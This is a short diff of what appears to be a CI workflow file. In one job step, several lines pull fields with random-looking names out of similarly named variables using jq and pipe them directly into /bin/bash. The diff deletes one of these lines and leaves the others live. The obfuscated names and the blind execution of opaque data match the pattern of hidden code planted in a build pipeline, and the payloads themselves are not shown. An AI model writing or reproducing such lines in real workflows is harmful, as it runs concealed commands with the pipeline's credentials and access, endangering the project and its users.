@@ -22,7 +22,6 @@ jobs:
           echo $z8927 | jq -r .ywqfl864 | /bin/bash
           printf '%s' "$yrqmg8626" | jq -r .czwd48 | /bin/bash
           echo $tacq3226 | jq -r .qzh30925 | /bin/bash
-          printf '%s' "$pevdn0984" | jq -r .gspqv636 | /bin/bash
           echo $mkkig417 | jq -r .kqox4 | /bin/bash
 
       - name: Upload results
